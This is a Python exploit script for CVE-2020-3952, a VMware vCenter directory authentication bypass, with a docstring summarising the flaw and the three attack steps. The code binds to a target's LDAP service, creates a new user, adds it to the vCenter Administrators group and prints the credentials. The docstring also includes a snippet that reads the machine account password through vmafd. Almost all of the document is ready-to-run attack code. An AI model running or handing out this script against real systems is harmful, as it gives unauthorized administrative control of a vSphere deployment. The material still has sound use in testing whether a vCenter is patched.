#!/usr/bin/env python
'''
This is a short piece of code that exploits of CVE-2020-3952, which is described in detail at the Guardicore Labs post over [here](https://www.guardicore.com/2020/04/pwning-vmware-vcenter-cve-2020-3952/).
This vulnerability was [published](https://www.vmware.com/security/advisories/VMSA-2020-0006.html) by VMware in April 2020 with a maximum CVSS score of 10.0. It allows an attacker with a network connection to take control of the vCenter Directory (and thus to the vSphere deployment).

VMware released a fix for this bug in vCenter Server 6.7 Update 3f. Any unpatched vCenter 6.7 that has been upgraded from a previous version is vulnerable to this attack. (Clean installs of vCenter 6.7 are not affected.)

We recommend reading the post to understand how this exploit works, but in short, it does three things:
1) Attempts an ldap bind request to the vmdird process. This should fail with invalid credentials.
2) Adds a new user with the requested username and password under the domain 'cn=NEW_USERNAME,cn=Users,dc=vsphere,dc=local'.
3) Adds the new user to the 'cn=Administrators,cn=Builtin,dc=vsphere,dc=local' group.


#!/usr/bin/env python

import sys
import vmafd

sys.path.append('/usr/lib/vmware-vmafd/lib64')

client = vmafd.client('localhost')

username = client.GetMachineName()
password = client.GetMachinePassword()

# auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass)
'''

import sys
import ldap
import ldap.modlist

if len(sys.argv) != 4:
    print('usage: exploit.py <VCENTER_IP> <NEW_USERNAME> <NEW_PASSWORD>')
    exit(1)

vcenter_ip = sys.argv[1]
new_username_str = sys.argv[2]
new_username = new_username_str.encode('utf-8')
new_password_str = sys.argv[3]
new_password = new_password_str.encode('utf-8')

dn = 'cn=' + new_username_str + ',cn=Users,dc=vsphere,dc=local'

modlist = {
    'vmwPasswordNeverExpires': [b'True'],
    'userPrincipalName': [new_username + b'@VSPHERE.LOCAL'],
    'sAMAccountName': [new_username],
    'givenName': [new_username],
    'sn': [b'vsphere.local'],
    'cn': [new_username],
    'uid': [new_username],
    'objectClass': [b'top', b'person', b'organizationalPerson', b'user'],
    'userPassword': new_password}

c = ldap.initialize('ldap://' + vcenter_ip)
try:
    c.simple_bind_s('Administrator@test.local', 'fakepassword')
except ldap.INVALID_CREDENTIALS:
    print('got expected ldap.INVALID_CREDENTIALS error on bind')
except:
    print('failed to bind with unexpected error')
    raise
else:
    print('did not receive ldap.INVALID_CREDENTIALS on bind! failing')
    exit(1)

try:
    c.add_s(dn, ldap.modlist.addModlist(modlist))
except ldap.ALREADY_EXISTS:
    print('user already exists, skipping add and granting administrator permissions')
except:
    print('failed to add user. this vCenter may not be vulnerable to CVE-2020-3952')
    raise

print('user added successfully, attempting to give it administrator permissions')

groupModList = [(ldap.MOD_ADD, 'member', [dn.encode('utf-8')])]
try:
    c.modify_s('cn=Administrators,cn=Builtin,dc=vsphere,dc=local', groupModList)
except ldap.TYPE_OR_VALUE_EXISTS:
    print('user already had administrator permissions')
except:
    print('user was added but failed to give it administrator permissions')
    raise

print('success! you can now connect to vSphere with your credentials.')
print('username: ' + new_username_str)
print('password: ' + new_password_str)
